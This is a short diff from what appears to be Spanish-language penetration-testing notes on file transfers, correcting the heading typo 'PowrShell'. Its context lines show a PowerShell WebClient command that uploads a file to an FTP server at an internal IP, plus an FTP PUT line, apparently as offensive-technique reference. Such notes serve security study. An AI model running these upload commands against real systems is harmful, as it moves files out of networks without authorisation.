@@ -193,7 +193,7 @@ PS C:\> (New-Object Net.WebClient).UploadFile('ftp://10.1.1.5/test.txt', 'ftp-te
 ftp> PUT test.txt
 ```
 
-### Cargas Web en PowrShell
+### Cargas Web en PowerShell
 
 ```bash
 ┌──(root㉿kali)-[/]
